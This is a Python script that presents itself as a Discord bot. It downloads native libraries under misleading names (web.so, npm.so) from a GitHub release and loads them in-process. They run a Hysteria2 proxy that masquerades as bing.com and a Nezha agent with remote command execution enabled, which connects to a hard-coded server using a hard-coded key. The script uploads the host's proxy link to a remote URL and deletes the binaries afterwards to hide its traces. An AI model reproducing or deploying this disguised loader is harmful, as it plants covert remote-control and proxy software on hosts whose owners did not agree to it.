#!/usr/bin/env python

import os
import re
import shutil
import ctypes
from ctypes import c_int, c_char_p
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import signal
import requests
from datetime import datetime
import json
import base64
import asyncio

FILE_PATH = os.environ.get('FILE_PATH', './.cache')
INTERVAL_SECONDS = int(os.environ.get("TIME", 100))
ENABLE_HTTPSERVER = os.environ.get('ENABLE_HTTPSERVER', 'true').lower() == 'true'
DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'
KEEPALIVE = os.environ.get('KEEPALIVE', 'false').lower() == 'true'
PORT = int(os.environ.get('PORT', 31511))
MYIP_URL = os.environ.get('MYIP_URL', '')
HY2_SNI = os.environ.get('HY2_SNI', 'https://bing.com')
HY2_PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('HY2_PORT') or 3001)
LOCAL_DOMAIN = os.environ.get('LOCAL_DOMAIN', '')

UUID = os.environ.get('UUID', '550ce8a4-4aff-4666-b1c3-39475f5523b2')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'my.tcguangda.eu.org')
NEZHA_KEY = os.environ.get('NEZHA_KEY', 'ilovehesufeng520')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '443')
SUB_NAME = os.environ.get('SUB_NAME', 'noblehost')
SUB_URL = os.environ.get('SUB_URL', 'https://jy.tcgd.nyc.mn/upload-aac316c5-a112-40e1-9319-10d25e4e8d44')

def log(level, msg):
    if not DEBUG and level == "DEBUG":
        return
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        print(f"[{timestamp}] [{level}] {msg}", flush=True)
    except (BrokenPipeError, OSError):
        pass
def info(msg):
    log("INFO", msg)
def debug(msg):
    if DEBUG:
        log("DEBUG", msg)
def warn(msg):
    log("WARN", msg)

def createFolder(folderPath):
    if not os.path.exists(folderPath):
        os.makedirs(folderPath)
        debug(f"{folderPath} is created")
    else:
        debug(f"{folderPath} already exists")

def clean_string(s):
    if isinstance(s, str):
        result = re.sub(r'[\s,.]', '_', s)
        result = re.sub(r'_+', '_', result)
        return result.strip('_')
    return s

pathsToDelete = ['web.so', 'npm.so', 'server.crt', 'server.key']
def cleanupOldFiles():
    for file in pathsToDelete:
        filePath = os.path.join(FILE_PATH, file)
        try:
            if os.path.exists(filePath):
                if os.path.isdir(filePath):
                    shutil.rmtree(filePath)
                    debug(f"{filePath} deleted")
                else:
                    os.remove(filePath)
                    debug(f"{filePath} deleted")
            else:
                debug(f"Skip Delete {filePath}")
        except Exception as err:
            debug(f"Failed to delete {filePath}: {err}")

def find_index_html():
    here = os.path.dirname(os.path.abspath(__file__))
    for folder in (here, os.path.dirname(here), os.getcwd()):
        path = os.path.join(folder, 'index.html')
        if os.path.isfile(path):
            return path
    return None

class MyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path.split('?', 1)[0] in ('/', '/index.html'):
            page = find_index_html()
            if page:
                try:
                    with open(page, 'rb') as file:
                        content = file.read()
                    content_type = 'text/html; charset=utf-8'
                except OSError as e:
                    debug(f"Failed to read {page}: {e}")
                    content = b'Hello, world'
                    content_type = 'text/plain; charset=utf-8'
            else:
                content = b'Hello, world'
                content_type = 'text/plain; charset=utf-8'
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not found')

def start_http_server():
    try:
        global http_server
        server = HTTPServer(('0.0.0.0', PORT), MyHandler)
        server.timeout = 0.5
        http_server = server
        debug(f"✅ server is running on port {PORT}")
        server.serve_forever()
    except OSError as e:
        debug(f"HTTP server failed on port {PORT}: {e}")
    except Exception as e:
        try:
            debug(f"HTTP server stopped: {e}")
        except (BrokenPipeError, OSError):
            pass

hy_lib = None
hy_running = False
agent_lib = None
agent_running = False
http_server = None
shutdown_started = False

def _ffi_thread(name, start_fn, config_json, on_exit):
    """在独立线程中运行阻塞的 FFI Start 函数"""
    try:
        code = start_fn(config_json.encode('utf-8'))
        if code != 0:
            debug(f"{name} exited with code: {code}")
        else:
            debug(f"{name} exited with code: {code}")
    except Exception as e:
        debug(f"{name} FFI error: {e}")
    finally:
        on_exit()

async def getcertificateandkey():
    try:
        key_path = os.path.join(FILE_PATH, "server.key")
        cert_path = os.path.join(FILE_PATH, "server.crt")

        gen_key = await asyncio.create_subprocess_shell(
            f"openssl ecparam -genkey -name prime256v1 -out {key_path}",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        await gen_key.communicate()
        if gen_key.returncode != 0:
            debug(f"openssl keygen failed (exit {gen_key.returncode})")

        gen_cert = await asyncio.create_subprocess_shell(
            f"openssl req -x509 -nodes -days 365000 -key {key_path} -out {cert_path} -subj '/CN=bing.com'",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        await gen_cert.communicate()
        if gen_cert.returncode != 0:
            debug(f"openssl cert failed (exit {gen_cert.returncode})")

        debug(f"Certificate generated: {FILE_PATH}")
    except Exception as e:
        debug(f"Certificate generation failed: {e}")

def get_files_for_architecture():
    arch = os.uname().machine
    is_arm = arch in ['arm', 'arm64', 'aarch64']
    suffix = '_arm' if is_arm else ''

    base_files = [
        {'file_name': 'web.so', 'file_url': f'https://github.com/kahunama/myfile/releases/download/native/hy{suffix}.so'},
    ]

    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        base_files.append({
            'file_name': 'npm.so',
            'file_url': f'https://github.com/kahunama/myfile/releases/download/native/agent{suffix}.so'
        })
    return base_files

def authorize_files(file_paths):
    for f in file_paths:
        absolute = os.path.join(FILE_PATH, f)
        try:
            os.chmod(absolute, 0o755)
            debug(f"Empowerment success for {absolute}")
        except Exception as e:
            debug(f"Empowerment failed for {absolute}: {e}")

async def download_function(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    if os.path.exists(file_path):
        debug(f"{file_name} already exists, skip download")
        return True, True

    retries = 5
    for i in range(retries):
        try:
            def _sync_download():
                temp_path = f'{file_path}.part'
                with requests.get(file_url, stream=True, timeout=(10, 60)) as response:
                    response.raise_for_status()
                    with open(temp_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            if chunk:
                                f.write(chunk)
                os.replace(temp_path, file_path)
            await asyncio.to_thread(_sync_download)
            return True, False
        except Exception as e:
            debug(f"Download {file_name} failed (Attempt {i+1}/{retries}): {e}")
            for candidate in (file_path, f'{file_path}.part'):
                if os.path.exists(candidate):
                    try:
                        os.remove(candidate)
                    except OSError as cleanup_error:
                        debug(f"Failed to remove incomplete download {candidate}: {cleanup_error}")
            if i < retries - 1:
                await asyncio.sleep(3)
            else:
                return False, False

async def download_files():
    files_to_download = get_files_for_architecture()
    if not files_to_download:
        debug("Can't find a file for the current architecture")
        return

    async def download_wrapper(f_name, f_url):
        success, existed = await download_function(f_name, f_url)
        if success:
            if not existed:
                debug(f"Downloaded {f_name} successfully")
            return f_name
        return None

    tasks = [download_wrapper(fi['file_name'], fi['file_url']) for fi in files_to_download]
    results = await asyncio.gather(*tasks)
    files_to_authorize = [f for f in results if f]
    authorize_files(files_to_authorize)

def webconfig():
    cert_path = os.path.join(FILE_PATH, "server.crt")
    key_path = os.path.join(FILE_PATH, "server.key")
    config = {
        "listen": f":{HY2_PORT}",
        "cert": cert_path,
        "key": key_path,
        "auth": {
            "type": "password",
            "password": UUID
        },
        "masquerade": {
            "type": "proxy",
            "proxy": {
                "url": HY2_SNI,
                "rewriteHost": True
            }
        }
    }
    debug(f"web FFI config: {json.dumps(config)}")
    return config

def get_agent_config():
    NEZHA_TLS_PORTS = {'443', '8443', '2096', '2087', '2083', '2053'}
    use_tls = NEZHA_PORT in NEZHA_TLS_PORTS
    return {
        "Debug": False,
        "Server": f"{NEZHA_SERVER}:{NEZHA_PORT}",
        "ClientSecret": NEZHA_KEY,
        "UUID": UUID,
        "DisableAutoUpdate": True,
        "DisableForceUpdate": True,
        "DisableCommandExecute": False,
        "GPU": False,
        "Temperature": False,
        "TLS": use_tls,
        "InsecureTLS": False,
        "ReportDelay": 4,
        "SkipConnectionCount": True,
        "SkipProcsCount": True,
        "DisableNat": False,
        "DisableSendQuery": False,
        "IPReportPeriod": 1800,
        "UseGiteeToUpgrade": False,
        "UseIPv6CountryCode": False,
        "Quiet": not DEBUG
    }

async def runweb():
    global hy_lib, hy_running

    so_path = os.path.join(FILE_PATH, 'web.so')
    if not os.path.exists(so_path):
        debug('web.so file not found, skip running')
        return
    if hy_running:
        debug('web is already running, skip')
        return

    try:
        hy_lib = ctypes.CDLL(so_path)
        debug(f"Loaded web.so: {so_path}")

        hy_lib.StartHysteriaServer.argtypes = [c_char_p]
        hy_lib.StartHysteriaServer.restype = c_int
        hy_lib.StopHysteriaServer.argtypes = []
        hy_lib.StopHysteriaServer.restype = c_int
        hy_lib.HysteriaVersion.argtypes = []
        hy_lib.HysteriaVersion.restype = c_char_p

        try:
            ver = hy_lib.HysteriaVersion()
            if ver:
                debug(f"hysteria version: {ver.decode()}")
        except Exception:
            pass

        config = webconfig()
        config_json = json.dumps(config)

        def on_exit():
            global hy_running
            hy_running = False

        hy_running = True
        t = threading.Thread(target=_ffi_thread,
                             args=('web', hy_lib.StartHysteriaServer, config_json, on_exit),
                             daemon=True)
        t.start()
        debug('web started via FFI')
    except Exception as e:
        debug(f"web FFI error: {e}")
        hy_running = False

def stopweb():
    global hy_lib, hy_running
    if not hy_lib or not hy_running:
        debug('web not running, skip stop')
        return
    try:
        hy_lib.StopHysteriaServer()
        debug('web stop signal sent')
    except Exception as e:
        debug(f"web stop error: {e}")

async def runnpm():
    global agent_lib, agent_running

    so_path = os.path.join(FILE_PATH, 'npm.so')
    if not os.path.exists(so_path):
        debug('npm.so file not found, skip running')
        return
    if agent_running:
        debug('agent is already running, skip')
        return

    try:
        agent_lib = ctypes.CDLL(so_path)
        debug(f"Loaded npm.so: {so_path}")

        agent_lib.StartNezhaAgent.argtypes = [c_char_p]
        agent_lib.StartNezhaAgent.restype = c_int
        agent_lib.StopNezhaAgent.argtypes = []
        agent_lib.StopNezhaAgent.restype = c_int

        config = get_agent_config()
        config_json = json.dumps(config)
        debug(f"agent config: {config_json}")

        def on_exit():
            global agent_running
            agent_running = False

        agent_running = True
        t = threading.Thread(target=_ffi_thread,
                             args=('agent', agent_lib.StartNezhaAgent, config_json, on_exit),
                             daemon=True)
        t.start()
        debug('agent started via FFI')
    except Exception as e:
        debug(f"agent FFI error: {e}")
        agent_running = False

def stopnpm():
    global agent_lib, agent_running
    if not agent_lib or not agent_running:
        debug('agent not running, skip stop')
        return
    try:
        agent_lib.StopNezhaAgent()
        debug('agent stop signal sent')
    except Exception as e:
        debug(f"agent stop error: {e}")

async def runapp():
    await runweb()
    await asyncio.sleep(1)
    debug("web is running")

    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        await runnpm()
        await asyncio.sleep(1)
        debug("agent is running")
    else:
        debug("nezha variable is empty, skip running")

async def keep_alive():
    global hy_running
    if hy_running:
        debug("web is already running")
    else:
        debug("web runs again !")
        await runweb()

    await asyncio.sleep(5)

    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        global agent_running
        if agent_running:
            debug("agent is already running")
        else:
            debug("agent runs again !")
            await runnpm()

def generate_links(MYIP, ISP):
    if LOCAL_DOMAIN:
        myaddress = LOCAL_DOMAIN
    else:
        myaddress = MYIP
    Node_DATA = f"hysteria2://{UUID}@{myaddress}:{HY2_PORT}/?sni=www.bing.com&alpn=h3&insecure=1#{ISP}-{SUB_NAME}"
    return Node_DATA

def get_ip_and_isp():
    ipapiurl = [
        'https://api.ip.sb/geoip/',
        'http://ip-api.com/json/',
    ]
    if MYIP_URL and MYIP_URL.strip():
        ipapiurl.append(MYIP_URL.strip())

    for url in ipapiurl:
        try:
            response = requests.get(url, timeout=3)
            data = response.json()
            raw_ip = data.get('ip') or data.get('query')
            if raw_ip:
                MYIP = f'[{raw_ip}]' if ':' in raw_ip and not raw_ip.startswith('[') else raw_ip
                country = data.get('country_code') or data.get('countryCode') or 'UN'
                isp_raw = data.get('isp', 'Unknown')
                ISP = f"{country}_{clean_string(isp_raw)}"
                return MYIP, ISP
        except requests.RequestException as error:
            debug(f"IP/ISP request failed for {url}: {error}")
            continue
        except (ValueError, TypeError, KeyError) as error:
            debug(f"Invalid IP/ISP response from {url}: {error}")
            continue
    return '1.1.1.1', 'UN'

async def cleanfiles():
    await asyncio.sleep(60)
    if KEEPALIVE:
        files_to_delete = []
    else:
        files_to_delete = [
            os.path.join(FILE_PATH, 'web.so'),
            os.path.join(FILE_PATH, 'npm.so'),
            os.path.join(FILE_PATH, 'server.crt'),
            os.path.join(FILE_PATH, 'server.key'),
        ]
    for filePath in files_to_delete:
        try:
            if os.path.exists(filePath):
                if os.path.isdir(filePath):
                    shutil.rmtree(filePath)
                else:
                    os.remove(filePath)
                debug(f"{filePath} deleted")
        except Exception as error:
            debug(f"Failed to delete {filePath}: {error}")

async def upload_subscription(sub_name, upload_data, sub_url):
    timeout = (10, 30)
    data = json.dumps({"URL_NAME": sub_name, "URL": upload_data})
    headers = {'Content-Type': 'application/json', 'Content-Length': str(len(data))}

    def _sync_upload():
        response = requests.post(
            sub_url, data=data, headers=headers, verify=True, timeout=timeout
        )
        response.raise_for_status()
        return response.text

    try:
        result = await asyncio.to_thread(_sync_upload)
        debug("Subscription uploaded successfully")
        return True, result
    except requests.RequestException as error:
        debug(f"Subscription upload failed: {error}")
    except Exception as error:
        debug(f"Subscription upload failed: {error}")
    return False, None

async def keep_alive_run():
    while True:
        await asyncio.sleep(INTERVAL_SECONDS)
        await keep_alive()

def gracefulExit(signum, frame):
    global shutdown_started
    if shutdown_started:
        return
    shutdown_started = True
    info(f'Shutting down ({signum})...')
    os.kill(os.getpid(), signal.SIGKILL)

signal.signal(signal.SIGINT, gracefulExit)
signal.signal(signal.SIGTERM, gracefulExit)

async def main():
    info("Discord Bot Start...")
    createFolder(FILE_PATH)
    cleanupOldFiles()

    await download_files()
    MYIP, ISP = get_ip_and_isp()
    await getcertificateandkey()
    await runapp()
    UPLOAD_DATA = generate_links(MYIP, ISP)

    if ENABLE_HTTPSERVER:
        http_thread = threading.Thread(target=start_http_server, daemon=True)
        http_thread.start()
    else:
        debug('HTTP server disabled by ENABLE_HTTPSERVER=false')

    tasks = [asyncio.create_task(cleanfiles())]
    if SUB_URL and SUB_NAME:
        uploaded, _ = await upload_subscription(SUB_NAME, UPLOAD_DATA, SUB_URL)
        if not uploaded:
            debug('Initial subscription upload failed; services will continue running')
    if KEEPALIVE:
        tasks.append(asyncio.create_task(keep_alive_run()))

    try:
        await asyncio.gather(*tasks)
        while True:
            await asyncio.sleep(1)
    except (KeyboardInterrupt, SystemExit):
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as error:
        debug(f"Fatal startup error: {error}")
